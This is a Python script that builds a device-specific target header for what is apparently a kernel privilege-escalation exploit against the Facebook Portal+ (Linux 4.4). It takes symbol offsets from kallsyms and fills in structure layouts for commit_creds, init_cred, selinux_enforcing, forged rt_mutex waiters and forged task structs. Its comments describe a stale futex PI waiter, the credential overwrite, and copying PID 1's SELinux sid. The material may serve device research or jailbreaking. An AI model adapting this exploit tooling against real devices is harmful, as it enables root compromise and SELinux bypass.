#!/usr/bin/env python3
"""Generate the first-generation Portal+ target from installed-kernel kallsyms.

The structural values are from Meta's portal-msm-4.4-kernel-master source
built with the running device's IKCONFIG. Symbol values must come from the
exact installed kernel image and are emitted relative to its arm64 link base.
"""

from pathlib import Path
import re
import shutil
import sys

BASE = 0xFFFFFF8008080000


def load_symbols(path: Path) -> dict[str, int]:
    symbols: dict[str, int] = {}
    for line in path.read_text(encoding="utf-8", errors="replace").splitlines():
        fields = line.split()
        if len(fields) >= 3 and re.fullmatch(r"[0-9a-fA-F]+", fields[0]):
            symbols[fields[-1]] = int(fields[0], 16)
    return symbols


def main() -> None:
    if len(sys.argv) != 4:
        raise SystemExit(
            "usage: generate_aloha_target.py INSTALLED_KALLSYMS "
            "PORTAL_GO_TARGET OUTPUT"
        )
    symbols = load_symbols(Path(sys.argv[1]))
    template = Path(sys.argv[2])
    output = Path(sys.argv[3])
    output.parent.mkdir(parents=True, exist_ok=True)
    shutil.copyfile(template, output)
    text = output.read_text(encoding="utf-8")

    symbol_macros = {
        "COMMIT_CREDS_OFF": "commit_creds",
        "PREPARE_KERNEL_CRED_OFF": "prepare_kernel_cred",
        "OVERRIDE_CREDS_OFF": "override_creds",
        "GET_TASK_CRED_OFF": "get_task_cred",
        "INIT_TASK_OFF": "init_task",
        "INIT_UTS_NS_OFF": "init_uts_ns",
        "INIT_CRED_OFF": "init_cred",
        "INIT_USER_NS_OFF": "init_user_ns",
        "INIT_GROUPS_OFF": "init_groups",
        "MEMSTART_ADDR_OFF": "memstart_addr",
        "MODULE_ALLOC_BASE_OFF": "module_alloc_base",
        "RESERVED_MEM_OFF": "reserved_mem",
        "EMPTY_ZERO_PAGE_OFF": "empty_zero_page",
        "ROOT_TASK_GROUP_OFF": "root_task_group",
        "KPTR_RESTRICT_OFF": "kptr_restrict",
        "SYSCALL_BOOTID_OFF": "sysctl_bootid",
        "NFULNL_LOGGER_OFF": "nfulnl_logger",
        "LOGGERS_0_1_OFF": "loggers",
        "ASHMEM_FOPS_OFF": "ashmem_fops",
        "ASHMEM_MISC_OFF": "ashmem_misc",
        "ASHMEM_IOCTL_OFF": "ashmem_ioctl",
        "ASHMEM_COMPAT_IOCTL_OFF": "compat_ashmem_ioctl",
        "ASHMEM_MMAP_OFF": "ashmem_mmap",
        "ASHMEM_OPEN_OFF": "ashmem_open",
        "ASHMEM_RELEASE_OFF": "ashmem_release",
        "ASHMEM_READ_ITER_OFF": "ashmem_read",
        "ASHMEM_LLSEEK_OFF": "ashmem_llseek",
        "NOOP_LLSEEK_OFF": "noop_llseek",
        "GENERIC_FILE_LLSEEK_OFF": "generic_file_llseek",
        "GENERIC_FILE_SPLICE_READ_OFF": "generic_file_splice_read",
        "DEFAULT_FILE_SPLICE_READ_OFF": "default_file_splice_read",
        "KERNEL_WRITE_OFF": "kernel_write",
        "FGET_OFF": "fget",
        "FPUT_OFF": "fput",
        "SYS_IOCTL_OFF": "SyS_ioctl",
        "CONFIGFS_READ_FILE_OFF": "configfs_read_file",
        "CONFIGFS_WRITE_FILE_OFF": "configfs_write_file",
        "KMALLOC_CACHES_OFF": "kmalloc_caches",
        "ANON_PIPE_BUF_OPS_OFF": "anon_pipe_buf_ops",
        "SELINUX_STATE_OFF": "selinux_enforcing",
        "SELINUX_ENFORCING_BOOT_OFF": "selinux_enforcing",
        "SECURITY_HOOK_HEADS_OFF": "security_hook_heads",
        "RT_MUTEX_START_PROXY_LOCK_OFF": "rt_mutex_start_proxy_lock",
        "REMOVE_WAITER_OFF": "remove_waiter",
        "RT_MUTEX_SLOWLOCK_OFF": "rt_mutex_slowlock",
        "RT_MUTEX_SETPRIO_OFF": "rt_mutex_setprio",
        "MARK_WAKEUP_NEXT_WAITER_OFF": "mark_wakeup_next_waiter",
        "FUTEX_REQUEUE_OFF": "futex_requeue",
        "FUTEX_LOCK_PI_OFF": "futex_lock_pi",
        "FUTEX_WAKE_OFF": "futex_wake",
        "KALLSYMS_LOOKUP_NAME_OFF": "kallsyms_lookup_name",
        "SLIDE_NFULNL_LOGGER_OFF": "nfulnl_logger",
        "SLIDE_SYSCTL_BOOTID_OFF": "sysctl_bootid",
        "SLIDE_INIT_TASK_OFF": "init_task",
        "SLIDE_ROOT_TASK_GROUP_OFF": "root_task_group",
        "SLIDE_PROC_UID_LOCK_OFF": "proc_uid_lock",
    }
    values = {
        macro: f"0x{symbols[symbol] - BASE:08x}ULL"
        for macro, symbol in symbol_macros.items()
    }

    # struct miscdevice has its mutable fops pointer at +0x10.
    values["ASHMEM_MISC_FOPS_OFF"] = (
        f"0x{symbols['ashmem_misc'] + 0x10 - BASE:08x}ULL"
    )
    # loggers[12][1] is followed by alignment padding, making it the safe
    # ULOG slot for the rb_erase collateral store.
    values["SLIDE_LOGGERS_0_1_OFF"] = (
        f"0x{symbols['loggers'] + 25 * 8 - BASE:08x}ULL"
    )
    # random_table[5].data: sizeof(struct ctl_table)=0x40, data is at +8.
    values["SLIDE_RANDOM_BOOT_ID_DATA_OFF"] = (
        f"0x{symbols['random_table'] + 5 * 0x40 + 8 - BASE:08x}ULL"
    )
    # Linux 4.4 has no separate nomerge ops table and no configfs binary
    # handlers. These compatibility aliases are not selected by this route.
    values["ANON_PIPE_BUF_NOMERGE_OPS_OFF"] = values["ANON_PIPE_BUF_OPS_OFF"]
    for macro in (
        "CONFIGFS_READ_BIN_FILE_OFF",
        "CONFIGFS_WRITE_BIN_FILE_OFF",
        "CONFIGFS_OPEN_BIN_FILE_OFF",
        "CONFIGFS_RELEASE_BIN_FILE_OFF",
    ):
        values[macro] = "0x00000000ULL"

    values.update(
        {
            "TASK_PI_USES_LEFTMOST": "1",
            "CONFIGFS_BUFFER_HAS_CB_MAX": "0",
            "BUILD_VARIANT_LABEL": '"portal_aloha_1041515800015050"',
            "BUILD_FINGERPRINT": '"Facebook/aloha_prod/aloha:9/PKQ1.191202.001/1041515800015050:user/prod-keys"',
            "KIMAGE_TEXT_BASE": "0xffffff8008080000ULL",
            "P0_PAGE_OFFSET": "0xffffffc000000000ULL",
            "P0_PHYS_OFFSET": "0x80000000ULL",
            "P0_NORMAL_PHYS_START": "0x100000000ULL",
            "P0_RAM_END": "0x180000000ULL",
            "P0_MEMSTART_ALIGN": "0x40000000ULL",
            "P0_KERNEL_PHYS_LOAD": "0x80080000ULL",
            "KERNELSNITCH_IDENTITY_START": "0xffffffc000000000ULL",
            "KERNELSNITCH_IDENTITY_END": "0xffffffffffffffffULL",
            "KERNELSNITCH_SLAB_SIZE": "0x8000ULL",
            "KERNELSNITCH_SLAB_OBJECT_SIZE": "0x340ULL",
            "KERNELSNITCH_SLAB_OBJECTS": "39",
            "DIRECT_MAP_BASE": "0xffffffc000000000ULL",
            "DIRECT_MAP_END": "0xffffffffffffffffULL",
            "VMEMMAP_START": "0xffffffbf00000000ULL",
            "PSELECT_WAITER_WORD_SHIFT": "2",
            "SIGSTAMP_WAITER_VREG_OFF": "0x38U",
            "KMALLOC_CACHE_TYPES": "1",
            "KMALLOC_CGROUP_TYPE": "0",
            "SLIDE_IDLE_RT_MUTEX_OFF": "0x00000000ULL",
            "SELINUX_ENFORCING": "(KIMAGE_TEXT_BASE + SELINUX_STATE_OFF)",
            "SELINUX_BLOB_SIZES": "(KIMAGE_TEXT_BASE + SELINUX_STATE_OFF)",
            "SELINUX_CRED_BLOB_OFF": "0",
            "FAKE_WAITER_TREE_ENTRY_OFF": "0x00",
            "FAKE_WAITER_TREE_PRIO_OFF": "0x40",
            "FAKE_WAITER_TREE_DEADLINE_OFF": "0x48",
            "FAKE_WAITER_PI_TREE_ENTRY_OFF": "0x18",
            "FAKE_WAITER_PI_TREE_PRIO_OFF": "0x40",
            "FAKE_WAITER_PI_TREE_DEADLINE_OFF": "0x48",
            "FAKE_WAITER_TASK_OFF": "0x30",
            "FAKE_WAITER_LOCK_OFF": "0x38",
            "FAKE_WAITER_WAKE_STATE_OFF": "0x48",
            "FAKE_WAITER_WW_CTX_OFF": "0x48",
            "FAKE_TASK_USAGE_OFF": "48",
            "FAKE_TASK_PRIO_OFF": "112",
            "FAKE_TASK_NORMAL_PRIO_OFF": "120",
            "FAKE_TASK_TASK_GROUP_OFF": "1016",
            "FAKE_TASK_PI_LOCK_OFF": "2156",
            "FAKE_TASK_PI_WAITERS_OFF": "2168",
            "FAKE_TASK_PI_TOP_TASK_OFF": "2176",
            "FAKE_TASK_PI_BLOCKED_ON_OFF": "2184",
            "WAITER_TREE_ENTRY_OFF": "0x00",
            "WAITER_PI_TREE_ENTRY_OFF": "0x18",
            "WAITER_TASK_OFF": "0x30",
            "WAITER_LOCK_OFF": "0x38",
            "WAITER_PRIO_OFF": "0x40",
            "WAITER_DEADLINE_OFF": "0x48",
            "WAITER_SIZE": "0x48",
            "RT_MUTEX_WAIT_LOCK_OFF": "0x00",
            "RT_MUTEX_WAITERS_OFF": "0x08",
            "RT_MUTEX_OWNER_OFF": "0x18",
            "TASK_PID_OFF": "1528",
            "TASK_TGID_OFF": "1532",
            "TASK_REAL_PARENT_OFF": "1544",
            "TASK_PARENT_OFF": "1552",
            "TASK_TASKS_OFF": "1280",
            "TASK_THREAD_GROUP_OFF": "1704",
            "TASK_MM_OFF": "1360",
            "TASK_ACTIVE_MM_OFF": "1368",
            "TASK_REAL_CRED_OFF": "1968",
            "TASK_CRED_OFF": "1976",
            "TASK_COMM_OFF": "1984",
            "TASK_FILES_OFF": "2016",
            "TASK_NSPROXY_OFF": "2024",
            "TASK_SIGNAL_OFF": "2032",
            "TASK_THREAD_OFF": "2608",
            "TASK_STACK_OFF": "40",
            "TASK_TI_FLAGS_OFF": "0",
            "TASK_TI_PREEMPT_OFF": "24",
            "TASK_TI_ADDR_LIMIT_OFF": "8",
            "TASK_PI_LOCK_OFF": "2156",
            "TASK_PI_WAITERS_OFF": "2168",
            "TASK_PI_TOP_TASK_OFF": "2176",
            "TASK_PI_BLOCKED_ON_OFF": "2184",
            "TASK_ATOMIC_FLAGS_OFF": "1472",
            "TASK_PRIO_OFF": "112",
            "TASK_STATIC_PRIO_OFF": "116",
            "TASK_NORMAL_PRIO_OFF": "120",
            "TASK_RT_PRIORITY_OFF": "124",
            "TASK_SIZE": "3568",
            "TASK_THREAD_INFO_FLAGS_OFF": "0",
            "TASK_SECCOMP_OFF": "2128",
            "THREAD_INFO_FLAGS_OFF": "0x00",
            "THREAD_INFO_PREEMPT_OFF": "0x18",
            "THREAD_INFO_ADDR_LIMIT_OFF": "0x08",
            "INODE_I_FOP_OFF": "336",
            "FOPS_OWNER_OFF": "0x00",
            "FOPS_LLSEEK_OFF": "0x08",
            "FOPS_READ_OFF": "0x10",
            "FOPS_WRITE_OFF": "0x18",
            "FOPS_READ_ITER_OFF": "0x20",
            "FOPS_WRITE_ITER_OFF": "0x28",
            "FOPS_ITERATE_OFF": "0x30",
            "FOPS_ITERATE_SHARED_OFF": "0x30",
            "FOPS_POLL_OFF": "0x38",
            "FOPS_UNLOCKED_IOCTL_OFF": "0x40",
            "FOPS_IOCTL_OFF": "FOPS_UNLOCKED_IOCTL_OFF",
            "FOPS_COMPAT_IOCTL_OFF": "0x48",
            "FOPS_MMAP_OFF": "0x50",
            "FOPS_OPEN_OFF": "0x58",
            "FOPS_FLUSH_OFF": "0x60",
            "FOPS_RELEASE_OFF": "0x68",
            "FOPS_FSYNC_OFF": "0x70",
            "FOPS_SPLICE_WRITE_OFF": "0xb0",
            "FOPS_SPLICE_READ_OFF": "0xb8",
            "FOPS_SHOW_FDINFO_OFF": "0xd0",
            "MM_CONTEXT_ID_OFF": "712",
            "MM_OWNER_OFF": "0",
            "CFG_COUNT_OFF": "0x00",
            "CFG_POS_OFF": "0x08",
            "CFG_PAGE_OFF": "0x10",
            "CFG_OPS_OFF": "0x18",
            "CFG_MUTEX_OFF": "0x20",
            "CFG_MUTEX_COUNT_OFF": "0x20",
            "CFG_MUTEX_WAIT_LOCK_OFF": "0x24",
            "CFG_MUTEX_WAIT_LIST_OFF": "0x28",
            "CFG_MUTEX_OWNER_OFF": "0x38",
            "CFG_MUTEX_OSQ_OFF": "0x40",
            "CFG_NEEDS_READ_FILL_OFF": "0x48",
            "CFG_READ_IN_PROGRESS_OFF": "0x00",
            "CFG_WRITE_IN_PROGRESS_OFF": "0x00",
            "CFG_BIN_BUFFER_OFF": "0x00",
            "CFG_BIN_BUFFER_SIZE_OFF": "0x00",
            "CFG_CB_MAX_SIZE_OFF": "0x00",
        }
    )

    values["MM_STRUCT_SZ"] = "0x340"
    values["MM_ORDER"] = "3"
    values["MM_PARTIALS"] = "5"
    values["CONFIGFS_ZERO_GUARD_SIZE"] = "32"

    for name, value in values.items():
        pattern = rf"(?m)^#define\s+{re.escape(name)}\s+.*$"
        replacement = f"#define {name} {value}"
        text, count = re.subn(pattern, replacement, text)
        if count == 0:
            text = text.replace(
                "#define TASK_PI_USES_LEFTMOST",
                replacement + "\n#define TASK_PI_USES_LEFTMOST",
                1,
            )

    text = text.replace(
        "Facebook Portal Go (terry), Android 10, Linux 4.9.227-perf+",
        "Facebook Portal+ (aloha), Android 9, Linux 4.4.153+",
    )
    text = text.replace(
        "Meta's 4.9.227 Portal kernel source",
        "Meta's 4.4.153 Portal kernel source",
    )
    text = text.replace("vmlinux_to_elf", "vmlinux-to-elf")
    text = text.replace(
        "installed 5051355900018050 kernel image",
        "installed 1041515800015050 kernel image",
    )
    text = text.replace(
        "#define SIGSTAMP_WAITER_VREG_OFF 0x38U",
        "#define SIGSTAMP_WAITER_VREG_OFF 0x38U\n"
        "/* Exact 4.4 PTRACE_SETREGSET stack-copy offset for the stale PI "
        "waiter.\n"
        " * futex_wait_requeue_pi places rt_waiter at frame +0xe0.  The "
        "futex_q is at\n"
        " * +0x128; using that later object would leave rt_waiter.lock "
        "unstamped. */\n"
        "#define SLIDE_FUTEX_WAITER_STACK_DEPTH 0x270U\n"
        "#define SLIDE_PTRACE_COPY_STACK_DEPTH 0x3a0U\n"
        "#define SLIDE_PTRACE_WAITER_OFF 0x130U",
    )
    text = text.replace("Linux 4.9 stores the private futex key", "Linux 4.4 stores the private futex key")
    text = text.replace("This 4.9 tree stores enforcement", "This 4.4 tree stores enforcement")
    text = text.replace(
        "#define SELINUX_KERNEL_SID 1",
        "#define SELINUX_KERNEL_SID 1\n"
        "/* Keep global SELinux state and its adjacent cache pointers "
        "untouched.  Root\n"
        " * this process first, then copy PID 1's live osid/sid into its "
        "security blob. */\n"
        "#define CONFIGFS_ROOT_CRED_SID_ONLY 1\n"
        "#define SELINUX_CRED_SECURITY_SIZE 0x18",
    )
    text = text.replace("rt_mutex_waiter (4.9", "rt_mutex_waiter (4.4")
    text = text.replace("rt_mutex (4.9", "rt_mutex (4.4")
    text = text.replace(
        "Portal ashmem uses the legacy read field and has no show_fdinfo handler.",
        "Portal ashmem uses the legacy read field and has no show_fdinfo handler.",
    )
    output.write_text(text, encoding="utf-8", newline="\n")


if __name__ == "__main__":
    main()
